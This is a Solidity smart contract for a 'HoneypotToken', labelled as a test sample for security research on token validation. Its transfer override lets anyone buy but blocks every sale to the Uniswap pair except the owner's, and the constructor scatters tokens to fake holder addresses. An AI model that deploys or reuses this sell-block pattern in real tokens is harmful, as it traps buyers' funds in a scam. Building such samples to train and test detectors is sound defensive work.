// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/**
 * ⚠️ WARNING: TEST CONTRACT FOR SECURITY RESEARCH ONLY ⚠️
 *
 * This contract is part of a security research project designed to test
 * and improve token validation systems. This contract contains known
 * vulnerabilities and malicious patterns.
 *
 * DO NOT USE IN PRODUCTION
 * FOR EDUCATIONAL AND TESTING PURPOSES ONLY
 */

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title HoneypotToken
 * @dev A token that allows buying but can prevent selling via a blacklist mechanism.
 */
contract HoneypotToken is ERC20, Ownable {
    address public uniswapPair;

    constructor(uint256 initialSupply) ERC20("Honeypot Token", "HPT") Ownable(msg.sender) {
        _mint(msg.sender, initialSupply);

        // Distribute 10% of supply to 20 random addresses (5000 tokens each)
        uint256 amountPerAddress = initialSupply / 200; // 0.5% each, 10% total
        for (uint256 i = 0; i < 20; i++) {
            address randomAddr = address(uint160(uint256(keccak256(abi.encodePacked(block.timestamp, i, msg.sender)))));
            _transfer(msg.sender, randomAddr, amountPerAddress);
        }
    }

    function setUniswapPair(address _pair) external onlyOwner {
        uniswapPair = _pair;
    }

    function _update(address from, address to, uint256 value) internal override {
        // If selling (sending to Uniswap Pair), only allow owner to sell
        if (to == uniswapPair && from != owner()) {
            revert("Transfer failed: Selling is restricted to owner");
        }
        
        super._update(from, to, value);
    }

    function WARNING() public pure returns (string memory) {
        return "This contract is a test contract for security research purposes only and should not be interacted with.";
    }
}

